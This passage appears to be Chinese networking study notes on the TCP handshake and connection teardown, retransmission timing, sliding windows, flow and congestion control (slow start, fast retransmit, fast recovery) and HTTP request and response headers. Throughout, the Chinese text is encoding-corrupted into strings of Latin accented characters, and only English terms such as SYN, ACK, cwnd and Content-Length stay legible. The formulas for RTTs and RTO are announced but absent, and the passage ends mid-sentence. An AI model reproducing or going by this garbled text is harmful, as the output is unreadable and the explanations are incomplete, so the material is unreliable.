å‘é€è¿žæŽ¥è¯·æ±‚æŠ¥æ–‡ï¼ŒSYN=1ï¼ŒACK=0ï¼Œé€‰æ‹©ä¸€ä¸ªåˆå§‹çš„åºå· xã€‚ B æ”¶åˆ°è¿žæŽ¥è¯·æ±‚æŠ¥æ–‡ï¼Œå¦‚æžœåŒæ„å»ºç«‹è¿žæŽ¥ï¼Œåˆ™å‘ A å‘é€è¿žæŽ¥ç¡®è®¤æŠ¥æ–‡ï¼ŒSYN=1ï¼ŒACK=1ï¼Œç¡®è®¤å·ä¸º x+1ï¼ŒåŒæ—¶ä¹Ÿé€‰æ‹©ä¸€ä¸ªåˆå§‹çš„åºå· yã€‚ A æ”¶åˆ° B çš„è¿žæŽ¥ç¡®è®¤æŠ¥æ–‡åŽï¼Œè¿˜è¦å‘ B å‘å‡ºç¡®è®¤ï¼Œç¡®è®¤å·ä¸º y+1ï¼Œåºå·ä¸º x+1ã€‚ B æ”¶åˆ° A çš„ç¡®è®¤åŽï¼Œè¿žæŽ¥å»ºç«‹ã€‚ ä¸‰æ¬¡æ¡æ‰‹çš„åŽŸå›  ç¬¬ä¸‰æ¬¡æ¡æ‰‹æ˜¯ä¸ºäº†é˜²æ­¢å¤±æ•ˆçš„è¿žæŽ¥è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨ï¼Œè®©æœåŠ¡å™¨é”™è¯¯æ‰“å¼€è¿žæŽ¥ã€‚ å®¢æˆ·ç«¯å‘é€çš„è¿žæŽ¥è¯·æ±‚å¦‚æžœåœ¨ç½‘ç»œä¸­æ»žç•™ï¼Œé‚£ä¹ˆå°±ä¼šéš”å¾ˆé•¿ä¸€æ®µæ—¶é—´æ‰èƒ½æ”¶åˆ°æœåŠ¡å™¨ç«¯å‘å›žçš„è¿žæŽ¥ç¡®è®¤ã€‚å®¢æˆ·ç«¯ç­‰å¾…ä¸€ä¸ªè¶…æ—¶é‡ä¼ æ—¶é—´ä¹‹åŽï¼Œå°±ä¼šé‡æ–°è¯·æ±‚è¿žæŽ¥ã€‚ä½†æ˜¯è¿™ä¸ªæ»žç•™çš„è¿žæŽ¥è¯·æ±‚æœ€åŽè¿˜æ˜¯ä¼šåˆ°è¾¾æœåŠ¡å™¨ï¼Œå¦‚æžœä¸è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±ä¼šæ‰“å¼€ä¸¤ä¸ªè¿žæŽ¥ã€‚å¦‚æžœæœ‰ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼Œå®¢æˆ·ç«¯ä¼šå¿½ç•¥æœåŠ¡å™¨ä¹‹åŽå‘é€çš„å¯¹æ»žç•™è¿žæŽ¥è¯·æ±‚çš„è¿žæŽ¥ç¡®è®¤ï¼Œä¸è¿›è¡Œç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼Œå› æ­¤å°±ä¸ä¼šå†æ¬¡æ‰“å¼€è¿žæŽ¥ã€‚ TCP çš„å››æ¬¡æŒ¥æ‰‹ ä»¥ä¸‹æè¿°ä¸è®¨è®ºåºå·å’Œç¡®è®¤å·ï¼Œå› ä¸ºåºå·å’Œç¡®è®¤å·çš„è§„åˆ™æ¯”è¾ƒç®€å•ã€‚å¹¶ä¸”ä¸è®¨è®º ACKï¼Œå› ä¸º ACK åœ¨è¿žæŽ¥å»ºç«‹ä¹‹åŽéƒ½ä¸º 1ã€‚ A å‘é€è¿žæŽ¥é‡Šæ”¾æŠ¥æ–‡ï¼ŒFIN=1ã€‚ B æ”¶åˆ°ä¹‹åŽå‘å‡ºç¡®è®¤ï¼Œæ­¤æ—¶ TCP å±žäºŽåŠå…³é—­çŠ¶æ€ï¼ŒB èƒ½å‘ A å‘é€æ•°æ®ä½†æ˜¯ A ä¸èƒ½å‘ B å‘é€æ•°æ®ã€‚ å½“ B ä¸å†éœ€è¦è¿žæŽ¥æ—¶ï¼Œå‘é€è¿žæŽ¥é‡Šæ”¾æŠ¥æ–‡ï¼ŒFIN=1ã€‚ A æ”¶åˆ°åŽå‘å‡ºç¡®è®¤ï¼Œè¿›å…¥ TIME-WAIT çŠ¶æ€ï¼Œç­‰å¾… 2 MSLï¼ˆæœ€å¤§æŠ¥æ–‡å­˜æ´»æ—¶é—´ï¼‰åŽé‡Šæ”¾è¿žæŽ¥ã€‚ B æ”¶åˆ° A çš„ç¡®è®¤åŽé‡Šæ”¾è¿žæŽ¥ã€‚ å››æ¬¡æŒ¥æ‰‹çš„åŽŸå›  å®¢æˆ·ç«¯å‘é€äº† FIN è¿žæŽ¥é‡Šæ”¾æŠ¥æ–‡ä¹‹åŽï¼ŒæœåŠ¡å™¨æ”¶åˆ°äº†è¿™ä¸ªæŠ¥æ–‡ï¼Œå°±è¿›å…¥äº† CLOSE-WAIT çŠ¶æ€ã€‚è¿™ä¸ªçŠ¶æ€æ˜¯ä¸ºäº†è®©æœåŠ¡å™¨ç«¯å‘é€è¿˜æœªä¼ é€å®Œæ¯•çš„æ•°æ®ï¼Œä¼ é€å®Œæ¯•ä¹‹åŽï¼ŒæœåŠ¡å™¨ä¼šå‘é€ FIN è¿žæŽ¥é‡Šæ”¾æŠ¥æ–‡ã€‚ TIME_WAIT å®¢æˆ·ç«¯æŽ¥æ”¶åˆ°æœåŠ¡å™¨ç«¯çš„ FIN æŠ¥æ–‡åŽè¿›å…¥æ­¤çŠ¶æ€ï¼Œæ­¤æ—¶å¹¶ä¸æ˜¯ç›´æŽ¥è¿›å…¥ CLOSED çŠ¶æ€ï¼Œè¿˜éœ€è¦ç­‰å¾…ä¸€ä¸ªæ—¶é—´è®¡æ—¶å™¨è®¾ç½®çš„æ—¶é—´ 2MSLã€‚è¿™ä¹ˆåšæœ‰ä¸¤ä¸ªç†ç”±ï¼š ç¡®ä¿æœ€åŽä¸€ä¸ªç¡®è®¤æŠ¥æ–‡èƒ½å¤Ÿåˆ°è¾¾ã€‚å¦‚æžœ B æ²¡æ”¶åˆ° A å‘é€æ¥çš„ç¡®è®¤æŠ¥æ–‡ï¼Œé‚£ä¹ˆå°±ä¼šé‡æ–°å‘é€è¿žæŽ¥é‡Šæ”¾è¯·æ±‚æŠ¥æ–‡ï¼ŒA ç­‰å¾…ä¸€æ®µæ—¶é—´å°±æ˜¯ä¸ºäº†å¤„ç†è¿™ç§æƒ…å†µçš„å‘ç”Ÿã€‚ ç­‰å¾…ä¸€æ®µæ—¶é—´æ˜¯ä¸ºäº†è®©æœ¬è¿žæŽ¥æŒç»­æ—¶é—´å†…æ‰€äº§ç”Ÿçš„æ‰€æœ‰æŠ¥æ–‡éƒ½ä»Žç½‘ç»œä¸­æ¶ˆå¤±ï¼Œä½¿å¾—ä¸‹ä¸€ä¸ªæ–°çš„è¿žæŽ¥ä¸ä¼šå‡ºçŽ°æ—§çš„è¿žæŽ¥è¯·æ±‚æŠ¥æ–‡ã€‚ TCP å¯é ä¼ è¾“TCP ä½¿ç”¨è¶…æ—¶é‡ä¼ æ¥å®žçŽ°å¯é ä¼ è¾“ï¼šå¦‚æžœä¸€ä¸ªå·²ç»å‘é€çš„æŠ¥æ–‡æ®µåœ¨è¶…æ—¶æ—¶é—´å†…æ²¡æœ‰æ”¶åˆ°ç¡®è®¤ï¼Œé‚£ä¹ˆå°±é‡ä¼ è¿™ä¸ªæŠ¥æ–‡æ®µã€‚ ä¸€ä¸ªæŠ¥æ–‡æ®µä»Žå‘é€å†åˆ°æŽ¥æ”¶åˆ°ç¡®è®¤æ‰€ç»è¿‡çš„æ—¶é—´ç§°ä¸ºå¾€è¿”æ—¶é—´ RTTï¼ŒåŠ æƒå¹³å‡å¾€è¿”æ—¶é—´ RTTs è®¡ç®—å¦‚ä¸‹ï¼š å…¶ä¸­ï¼Œ0 â‰¤ a ï¼œ 1ï¼ŒRTTs éšç€ a çš„å¢žåŠ æ›´å®¹æ˜“å—åˆ° RTT çš„å½±å“ã€‚ è¶…æ—¶æ—¶é—´ RTO åº”è¯¥ç•¥å¤§äºŽ RTTsï¼ŒTCP ä½¿ç”¨çš„è¶…æ—¶æ—¶é—´è®¡ç®—å¦‚ä¸‹ï¼š å…¶ä¸­ RTTd ä¸ºåå·®çš„åŠ æƒå¹³å‡å€¼ã€‚ TCP æ»‘åŠ¨çª—å£çª—å£æ˜¯ç¼“å­˜çš„ä¸€éƒ¨åˆ†ï¼Œç”¨æ¥æš‚æ—¶å­˜æ”¾å­—èŠ‚æµã€‚å‘é€æ–¹å’ŒæŽ¥æ”¶æ–¹å„æœ‰ä¸€ä¸ªçª—å£ï¼ŒæŽ¥æ”¶æ–¹é€šè¿‡ TCP æŠ¥æ–‡æ®µä¸­çš„çª—å£å­—æ®µå‘Šè¯‰å‘é€æ–¹è‡ªå·±çš„çª—å£å¤§å°ï¼Œå‘é€æ–¹æ ¹æ®è¿™ä¸ªå€¼å’Œå…¶å®ƒä¿¡æ¯è®¾ç½®è‡ªå·±çš„çª—å£å¤§å°ã€‚ å‘é€çª—å£å†…çš„å­—èŠ‚éƒ½å…è®¸è¢«å‘é€ï¼ŒæŽ¥æ”¶çª—å£å†…çš„å­—èŠ‚éƒ½å…è®¸è¢«æŽ¥æ”¶ã€‚å¦‚æžœå‘é€çª—å£å·¦éƒ¨çš„å­—èŠ‚å·²ç»å‘é€å¹¶ä¸”æ”¶åˆ°äº†ç¡®è®¤ï¼Œé‚£ä¹ˆå°±å°†å‘é€çª—å£å‘å³æ»‘åŠ¨ä¸€å®šè·ç¦»ï¼Œç›´åˆ°å·¦éƒ¨ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸æ˜¯å·²å‘é€å¹¶ä¸”å·²ç¡®è®¤çš„çŠ¶æ€ï¼›æŽ¥æ”¶çª—å£çš„æ»‘åŠ¨ç±»ä¼¼ï¼ŒæŽ¥æ”¶çª—å£å·¦éƒ¨å­—èŠ‚å·²ç»å‘é€ç¡®è®¤å¹¶äº¤ä»˜ä¸»æœºï¼Œå°±å‘å³æ»‘åŠ¨æŽ¥æ”¶çª—å£ã€‚ æŽ¥æ”¶çª—å£åªä¼šå¯¹çª—å£å†…æœ€åŽä¸€ä¸ªæŒ‰åºåˆ°è¾¾çš„å­—èŠ‚è¿›è¡Œç¡®è®¤ï¼Œä¾‹å¦‚æŽ¥æ”¶çª—å£å·²ç»æ”¶åˆ°çš„å­—èŠ‚ä¸º {31, 34, 35}ï¼Œå…¶ä¸­ {31} æŒ‰åºåˆ°è¾¾ï¼Œè€Œ {34, 35} å°±ä¸æ˜¯ï¼Œå› æ­¤åªå¯¹å­—èŠ‚ 31 è¿›è¡Œç¡®è®¤ã€‚å‘é€æ–¹å¾—åˆ°ä¸€ä¸ªå­—èŠ‚çš„ç¡®è®¤ä¹‹åŽï¼Œå°±çŸ¥é“è¿™ä¸ªå­—èŠ‚ä¹‹å‰çš„æ‰€æœ‰å­—èŠ‚éƒ½å·²ç»è¢«æŽ¥æ”¶ã€‚ TCP æµé‡æŽ§åˆ¶æµé‡æŽ§åˆ¶æ˜¯ä¸ºäº†æŽ§åˆ¶å‘é€æ–¹å‘é€é€ŸçŽ‡ï¼Œä¿è¯æŽ¥æ”¶æ–¹æ¥å¾—åŠæŽ¥æ”¶ã€‚ æŽ¥æ”¶æ–¹å‘é€çš„ç¡®è®¤æŠ¥æ–‡ä¸­çš„çª—å£å­—æ®µå¯ä»¥ç”¨æ¥æŽ§åˆ¶å‘é€æ–¹çª—å£å¤§å°ï¼Œä»Žè€Œå½±å“å‘é€æ–¹çš„å‘é€é€ŸçŽ‡ã€‚å°†çª—å£å­—æ®µè®¾ç½®ä¸º 0ï¼Œåˆ™å‘é€æ–¹ä¸èƒ½å‘é€æ•°æ®ã€‚ TCP æ‹¥å¡žæŽ§åˆ¶å¦‚æžœç½‘ç»œå‡ºçŽ°æ‹¥å¡žï¼Œåˆ†ç»„å°†ä¼šä¸¢å¤±ï¼Œæ­¤æ—¶å‘é€æ–¹ä¼šç»§ç»­é‡ä¼ ï¼Œä»Žè€Œå¯¼è‡´ç½‘ç»œæ‹¥å¡žç¨‹åº¦æ›´é«˜ã€‚å› æ­¤å½“å‡ºçŽ°æ‹¥å¡žæ—¶ï¼Œåº”å½“æŽ§åˆ¶å‘é€æ–¹çš„é€ŸçŽ‡ã€‚è¿™ä¸€ç‚¹å’Œæµé‡æŽ§åˆ¶å¾ˆåƒï¼Œä½†æ˜¯å‡ºå‘ç‚¹ä¸åŒã€‚æµé‡æŽ§åˆ¶æ˜¯ä¸ºäº†è®©æŽ¥æ”¶æ–¹èƒ½æ¥å¾—åŠæŽ¥æ”¶ï¼Œè€Œæ‹¥å¡žæŽ§åˆ¶æ˜¯ä¸ºäº†é™ä½Žæ•´ä¸ªç½‘ç»œçš„æ‹¥å¡žç¨‹åº¦ã€‚ TCP ä¸»è¦é€šè¿‡å››ä¸ªç®—æ³•æ¥è¿›è¡Œæ‹¥å¡žæŽ§åˆ¶ï¼šæ…¢å¼€å§‹ã€æ‹¥å¡žé¿å…ã€å¿«é‡ä¼ ã€å¿«æ¢å¤ã€‚ å‘é€æ–¹éœ€è¦ç»´æŠ¤ä¸€ä¸ªå«åšæ‹¥å¡žçª—å£ï¼ˆcwndï¼‰çš„çŠ¶æ€å˜é‡ï¼Œæ³¨æ„æ‹¥å¡žçª—å£ä¸Žå‘é€æ–¹çª—å£çš„åŒºåˆ«ï¼šæ‹¥å¡žçª—å£åªæ˜¯ä¸€ä¸ªçŠ¶æ€å˜é‡ï¼Œå®žé™…å†³å®šå‘é€æ–¹èƒ½å‘é€å¤šå°‘æ•°æ®çš„æ˜¯å‘é€æ–¹çª—å£ã€‚ ä¸ºäº†ä¾¿äºŽè®¨è®ºï¼Œåšå¦‚ä¸‹å‡è®¾ï¼š æŽ¥æ”¶æ–¹æœ‰è¶³å¤Ÿå¤§çš„æŽ¥æ”¶ç¼“å­˜ï¼Œå› æ­¤ä¸ä¼šå‘ç”Ÿæµé‡æŽ§åˆ¶ï¼› è™½ç„¶ TCP çš„çª—å£åŸºäºŽå­—èŠ‚ï¼Œä½†æ˜¯è¿™é‡Œè®¾çª—å£çš„å¤§å°å•ä½ä¸ºæŠ¥æ–‡æ®µã€‚ æ…¢å¯åŠ¨ä¸Žæ‹¥å¡žé¿å…å‘é€çš„æœ€åˆæ‰§è¡Œæ…¢å¼€å§‹ï¼Œä»¤ cwnd = 1ï¼Œå‘é€æ–¹åªèƒ½å‘é€ 1 ä¸ªæŠ¥æ–‡æ®µï¼›å½“æ”¶åˆ°ç¡®è®¤åŽï¼Œå°† cwnd åŠ å€ï¼Œå› æ­¤ä¹‹åŽå‘é€æ–¹èƒ½å¤Ÿå‘é€çš„æŠ¥æ–‡æ®µæ•°é‡ä¸ºï¼š2ã€4ã€8 â€¦ æ³¨æ„åˆ°æ…¢å¼€å§‹æ¯ä¸ªè½®æ¬¡éƒ½å°† cwnd åŠ å€ï¼Œè¿™æ ·ä¼šè®© cwnd å¢žé•¿é€Ÿåº¦éžå¸¸å¿«ï¼Œä»Žè€Œä½¿å¾—å‘é€æ–¹å‘é€çš„é€Ÿåº¦å¢žé•¿é€Ÿåº¦è¿‡å¿«ï¼Œç½‘ç»œæ‹¥å¡žçš„å¯èƒ½æ€§ä¹Ÿå°±æ›´é«˜ã€‚è®¾ç½®ä¸€ä¸ªæ…¢å¼€å§‹é—¨é™ ssthreshï¼Œå½“ cwnd &gt;= ssthresh æ—¶ï¼Œè¿›å…¥æ‹¥å¡žé¿å…ï¼Œæ¯ä¸ªè½®æ¬¡åªå°† cwnd åŠ  1ã€‚ å¦‚æžœå‡ºçŽ°äº†è¶…æ—¶ï¼Œåˆ™ä»¤ ssthresh = cwnd / 2ï¼Œç„¶åŽé‡æ–°æ‰§è¡Œæ…¢å¼€å§‹ã€‚ å¿«é‡ä¼ ä¸Žå¿«æ¢å¤åœ¨æŽ¥æ”¶æ–¹ï¼Œè¦æ±‚æ¯æ¬¡æŽ¥æ”¶åˆ°æŠ¥æ–‡æ®µéƒ½åº”è¯¥å¯¹æœ€åŽä¸€ä¸ªå·²æ”¶åˆ°çš„æœ‰åºæŠ¥æ–‡æ®µè¿›è¡Œç¡®è®¤ã€‚ä¾‹å¦‚å·²ç»æŽ¥æ”¶åˆ° M1 å’Œ M2ï¼Œæ­¤æ—¶æ”¶åˆ° M4ï¼Œåº”å½“å‘é€å¯¹ M2 çš„ç¡®è®¤ã€‚ åœ¨å‘é€æ–¹ï¼Œå¦‚æžœæ”¶åˆ°ä¸‰ä¸ªé‡å¤ç¡®è®¤ï¼Œé‚£ä¹ˆå¯ä»¥çŸ¥é“ä¸‹ä¸€ä¸ªæŠ¥æ–‡æ®µä¸¢å¤±ï¼Œæ­¤æ—¶æ‰§è¡Œå¿«é‡ä¼ ï¼Œç«‹å³é‡ä¼ ä¸‹ä¸€ä¸ªæŠ¥æ–‡æ®µã€‚ä¾‹å¦‚æ”¶åˆ°ä¸‰ä¸ª M2ï¼Œåˆ™ M3 ä¸¢å¤±ï¼Œç«‹å³é‡ä¼  M3ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåªæ˜¯ä¸¢å¤±ä¸ªåˆ«æŠ¥æ–‡æ®µï¼Œè€Œä¸æ˜¯ç½‘ç»œæ‹¥å¡žã€‚å› æ­¤æ‰§è¡Œå¿«æ¢å¤ï¼Œä»¤ ssthresh = cwnd / 2 ï¼Œcwnd = ssthreshï¼Œæ³¨æ„åˆ°æ­¤æ—¶ç›´æŽ¥è¿›å…¥æ‹¥å¡žé¿å…ã€‚ æ…¢å¼€å§‹å’Œå¿«æ¢å¤çš„å¿«æ…¢æŒ‡çš„æ˜¯ cwnd çš„è®¾å®šå€¼ï¼Œè€Œä¸æ˜¯ cwnd çš„å¢žé•¿é€ŸçŽ‡ã€‚æ…¢å¼€å§‹ cwnd è®¾å®šä¸º 1ï¼Œè€Œå¿«æ¢å¤ cwnd è®¾å®šä¸º ssthreshã€‚ åº”ç”¨å±‚â€”HTTPä¸€ ã€åŸºç¡€æ¦‚å¿µè¯·æ±‚å’Œå“åº”æŠ¥æ–‡ è¯·æ±‚æŠ¥æ–‡ Httpè¯·æ±‚æŠ¥æ–‡ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šè¯·æ±‚è¡Œï¼Œè¯·æ±‚å¤´ï¼Œè¯·æ±‚ä½“ è¯·æ±‚è¡Œï¼šè¯·æ±‚æ–¹æ³•ã€è¯·æ±‚åœ°å€ã€åè®®åç§°å’Œç‰ˆæœ¬å·è¯·æ±‚å¤´ï¼šRefererã€User-Agentã€Acceptã€Cookieã€Cache-Controlã€Content-Lengthç­‰å±žæ€§ã€‚Content-Lengthå¯ç”¨äºŽæœåŠ¡ç«¯åˆ¤æ–­æ¶ˆæ¯æŽ¥å—å®Œçš„æ¡ä»¶è¯·æ±‚ä½“ï¼šGETè¯·æ±‚ä¸ŽPOSTè¯·æ±‚ä¼ é€’æ–¹å¼ä¸åŒ(Message Body) Acceptï¼šæµè§ˆå™¨å¯æŽ¥å—çš„MIMEç±»åž‹ã€‚Accept-Charsetï¼šæµè§ˆå™¨å¯æŽ¥å—çš„å­—ç¬¦é›†ã€‚Accept-Encodingï¼šæµè§ˆå™¨èƒ½å¤Ÿè¿›è¡Œè§£ç çš„æ•°æ®ç¼–ç æ–¹å¼ï¼Œæ¯”å¦‚gzipã€‚Servletèƒ½å¤Ÿå‘æ”¯æŒgzipçš„æµè§ˆå™¨è¿”å›žç»gzipç¼–ç çš„HTMLé¡µé¢ã€‚è®¸å¤šæƒ…å½¢ä¸‹è¿™å¯ä»¥å‡å°‘5åˆ°10å€çš„ä¸‹è½½æ—¶é—´ã€‚Accept-Languageï¼šæµè§ˆå™¨æ‰€å¸Œæœ›çš„è¯­è¨€ç§ç±»ï¼Œå½“æœåŠ¡å™¨èƒ½å¤Ÿæä¾›ä¸€ç§ä»¥ä¸Šçš„è¯­è¨€ç‰ˆæœ¬æ—¶è¦ç”¨åˆ°ã€‚ Authorizationï¼šæŽˆæƒä¿¡æ¯ï¼Œé€šå¸¸å‡ºçŽ°åœ¨å¯¹æœåŠ¡å™¨å‘é€çš„WWW-Authenticateå¤´çš„åº”ç­”ä¸­ã€‚ Connectionï¼šè¡¨ç¤ºæ˜¯å¦éœ€è¦æŒä¹…è¿žæŽ¥ã€‚ Content-Lengthï¼šè¡¨ç¤ºè¯·æ±‚æ¶ˆæ¯æ­£æ–‡çš„é•¿åº¦ã€‚ Cookieï¼šè¿™æ˜¯æœ€é‡è¦çš„è¯·æ±‚å¤´ä¿¡æ¯ä¹‹ä¸€ Fromï¼šè¯·æ±‚å‘é€è€…çš„emailåœ°å€ï¼Œç”±ä¸€äº›ç‰¹æ®Šçš„Webå®¢æˆ·ç¨‹åºä½¿ç”¨ï¼Œæµè§ˆå™¨ä¸ä¼šç”¨åˆ°å®ƒã€‚ Hostï¼šåˆå§‹URLä¸­çš„ä¸»æœºå’Œç«¯å£ã€‚ If-Modified-Sinceï¼šåªæœ‰å½“æ‰€è¯·æ±‚çš„å†…å®¹åœ¨æŒ‡å®šçš„æ—¥æœŸä¹‹åŽåˆç»è¿‡ä¿®æ”¹æ‰è¿”å›žå®ƒï¼Œå¦åˆ™è¿”å›ž304â€œNot Modifiedâ€åº”ç­”ã€‚ Pragmaï¼šæŒ‡å®šâ€œno-cacheâ€å€¼è¡¨ç¤ºæœåŠ¡å™¨å¿…é¡»è¿”å›žä¸€ä¸ªåˆ·æ–°åŽçš„æ–‡æ¡£ï¼Œå³ä½¿å®ƒæ˜¯ä»£ç†æœåŠ¡å™¨è€Œä¸”å·²ç»æœ‰äº†é¡µé¢çš„æœ¬åœ°æ‹·è´ã€‚ Refererï¼šåŒ…å«ä¸€ä¸ªURLï¼Œç”¨æˆ·ä»Žè¯¥URLä»£è¡¨çš„é¡µé¢å‡ºå‘è®¿é—®å½“å‰è¯·æ±‚çš„é¡µé¢ã€‚ User-Agentï¼šæµè§ˆå™¨ç±»åž‹ï¼Œå¦‚æžœServletè¿”å›žçš„å†…å®¹ä¸Žæµè§ˆå™¨ç±»åž‹æœ‰å…³åˆ™è¯¥å€¼éžå¸¸æœ‰ç”¨ã€‚ POST è¯·æ±‚ä½“ç±»åž‹åˆ†ç±»form-dataï¼šå°±æ˜¯httpè¯·æ±‚ä¸­çš„multipart/form-data,å®ƒä¼šå°†è¡¨å•çš„æ•°æ®å¤„ç†ä¸ºä¸€æ¡æ¶ˆæ¯ï¼Œä»¥æ ‡ç­¾ä¸ºå•å…ƒï¼Œç”¨åˆ†éš”ç¬¦åˆ†å¼€ã€‚æ—¢å¯ä»¥ä¸Šä¼ é”®å€¼å¯¹ï¼Œä¹Ÿå¯ä»¥ä¸Šä¼ æ–‡ä»¶ã€‚å½“ä¸Šä¼ çš„å­—æ®µæ˜¯æ–‡ä»¶æ—¶ï¼Œä¼šæœ‰Content-Typeæ¥è¡¨åæ–‡ä»¶ç±»åž‹ï¼›content-dispositionï¼Œç”¨æ¥è¯´æ˜Žå­—æ®µçš„ä¸€äº›ä¿¡æ¯ï¼›ç”±äºŽæœ‰boundaryéš”ç¦»ï¼Œæ‰€ä»¥multipart/form-dataæ—¢å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä¸Šä¼ é”®å€¼å¯¹ï¼Œå®ƒé‡‡ç”¨äº†é”®å€¼å¯¹çš„æ–¹å¼ï¼Œæ‰€ä»¥å¯ä»¥ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ã€‚å¯ä»¥æ¨¡æ‹Ÿå¡«å†™è¡¨å•ï¼Œå¹¶ä¸”æäº¤è¡¨å•ã€‚å¯ä»¥é€‰æ‹©æ–‡ä»¶ç±»åž‹ï¼Œä½†ä¸èƒ½ä¿å­˜åŽ†å²è®°å½•x-www-form-urlencodedï¼šå°±æ˜¯application/x-www-from-urlencoded,ä¼šå°†è¡¨å•å†…çš„æ•°æ®è½¬æ¢ä¸ºé”®å€¼å¯¹rawï¼šåŽŸç”Ÿä»»æ„æ ¼å¼çš„æ–‡æœ¬ï¼Œtextã€jsonã€xmlã€htmlbinaryï¼šç›¸å½“äºŽContent-Type:application/octet-stream,ä»Žå­—é¢æ„æ€å¾—çŸ¥ï¼Œåªå¯ä»¥ä¸Šä¼ äºŒè¿›åˆ¶æ•°æ®ï¼Œé€šå¸¸ç”¨æ¥ä¸Šä¼ æ–‡ä»¶ï¼Œç”±äºŽæ²¡æœ‰é”®å€¼ï¼Œæ‰€ä»¥ï¼Œä¸€æ¬¡åªèƒ½ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ã€‚image, audio or video files.text filesï¼Œä¹Ÿä¸èƒ½ä¿å­˜åŽ†å²è®°å½•ï¼Œæ¯æ¬¡é€‰æ‹©æ–‡ä»¶ï¼Œæäº¤ å“åº”æŠ¥æ–‡ å“åº”è¡Œï¼šæŠ¥æ–‡åè®®åŠç‰ˆæœ¬ï¼ŒçŠ¶æ€ç åŠçŠ¶æ€æè¿°å“åº”å¤´ï¼šRefererã€User-Agentã€Acceptã€Cookieã€Cache-Controlç­‰å±žæ€§å“åº”ä½“ï¼šæœåŠ¡å™¨è¿”å›žçš„æ•°æ® Allow æœåŠ¡å™¨æ”¯æŒå“ªäº›è¯·æ±‚æ–¹æ³•ï¼ˆå¦‚GETã€POSTç­‰ï¼‰ã€‚ Content-Encoding æ–‡æ¡£çš„ç¼–ç ï¼ˆEncodeï¼‰æ–¹æ³•ã€‚åªæœ‰åœ¨è§£ç ä¹‹åŽæ‰å¯ä»¥å¾—åˆ°Content-Typeå¤´æŒ‡å®šçš„å†…å®¹ç±»åž‹ã€‚åˆ©ç”¨gzipåŽ‹ç¼©æ–‡æ¡£èƒ½å¤Ÿæ˜¾è‘—åœ°å‡å°‘HTMLæ–‡æ¡£çš„ä¸‹è½½æ—¶é—´ã€‚ Content-Length è¡¨ç¤ºå†…å®¹é•¿åº¦ã€‚åªæœ‰å½“æµè§ˆå™¨ä½¿ç”¨æŒä¹…HTTPè¿žæŽ¥æ—¶æ‰éœ€è¦è¿™ä¸ªæ•°æ®ã€‚å¦‚æžœä½ æƒ³è¦åˆ©ç”¨æŒä¹…è¿žæŽ¥çš„ä¼˜åŠ¿ï¼Œå¯ä»¥æŠŠè¾“å‡ºæ–‡æ¡£å†™å…¥ByteArrayOutputStramï¼Œå®ŒæˆåŽæŸ¥çœ‹å…¶å¤§å°ï¼Œç„¶åŽæŠŠè¯¥å€¼æ”¾å…¥Content-Lengthå¤´ï¼Œæœ€åŽé€šè¿‡byteArrayStream.writeTo(response.getOutputStream()å‘é€å†…å®¹ã€‚ Content-Type è¡¨ç¤ºåŽé¢çš„æ–‡æ¡£å±žäºŽä»€ä¹ˆMIMEç±»åž‹ã€‚Servleté»˜è®¤ä¸ºtext/plainï¼Œä½†é€šå¸¸éœ€è¦æ˜¾å¼åœ°æŒ‡å®šä¸ºtext/htmlã€‚ç”±äºŽç»å¸¸è¦è®¾ç½®Content-Typeï¼Œå› æ­¤HttpServletResponseæä¾›äº†ä¸€ä¸ªä¸“ç”¨çš„æ–¹æ³•setContentTypeã€‚ Date å½“å‰çš„GMTæ—¶é—´ã€‚ä½ å¯ä»¥ç”¨setDateHeaderæ¥è®¾ç½®è¿™ä¸ªå¤´ä»¥é¿å…è½¬æ¢æ—¶é—´æ ¼å¼çš„éº»çƒ¦ã€‚ Expires åº”è¯¥åœ¨ä»€ä¹ˆæ—¶å€™è®¤ä¸ºæ–‡æ¡£å·²ç»è¿‡æœŸï¼Œä»Žè€Œä¸å†ç¼“å­˜å®ƒï¼Ÿ Last-Modified æ–‡æ¡£çš„æœ€åŽæ”¹åŠ¨æ—¶é—´ã€‚å®¢æˆ·å¯ä»¥é€šè¿‡If-Modified-Sinceè¯·æ±‚å¤´æä¾›ä¸€ä¸ªæ—¥æœŸï¼Œè¯¥è¯·æ±‚å°†è¢«è§†ä¸ºä¸€ä¸ªæ¡ä»¶GETï¼Œåªæœ‰æ”¹åŠ¨æ—¶é—´è¿ŸäºŽæŒ‡å®šæ—¶é—´çš„æ–‡æ¡£æ‰ä¼šè¿”å›žï¼Œå¦åˆ™è¿”å›žä¸€ä¸ª304ï¼ˆNot Modifiedï¼‰çŠ¶æ€ã€‚Last-Modifiedä¹Ÿå¯ç”¨setDateHeaderæ–¹æ³•æ¥è®¾ç½®ã€‚ Location è¡¨ç¤ºå®¢æˆ·åº”å½“åˆ°å“ªé‡ŒåŽ»æå–æ–‡æ¡£ã€‚ Refresh è¡¨ç¤ºæµè§ˆå™¨åº”è¯¥åœ¨å¤šå°‘æ—¶é—´ä¹‹åŽåˆ·æ–°æ–‡æ¡£ï¼Œä»¥ç§’è®¡ã€‚é™¤äº†åˆ·æ–°å½“å‰æ–‡æ¡£ä¹‹å¤–ï¼Œä½ è¿˜å¯ä»¥é€šè¿‡setHeader(â€œRefreshâ€, â€œ5; URL=http://host/path&quot;)è®©æµè§ˆå™¨è¯»å–æŒ‡å®šçš„é¡µé¢ã€‚æ³¨æ„è¿™ç§åŠŸèƒ½é€šå¸¸æ˜¯é€šè¿‡è®¾ç½®HTMLé¡µé¢HEADåŒºçš„å®žçŽ°ï¼Œè¿™æ˜¯å› ä¸ºï¼Œè‡ªåŠ¨åˆ·æ–°æˆ–é‡å®šå‘å¯¹äºŽé‚£äº›ä¸èƒ½ä½¿ç”¨CGIæˆ–Servletçš„HTMLç¼–å†™è€…ååˆ†é‡è¦ã€‚ä½†æ˜¯ï¼Œå¯¹äºŽServletæ¥è¯´ï¼Œç›´æŽ¥è®¾ç½®Refreshå¤´æ›´åŠ 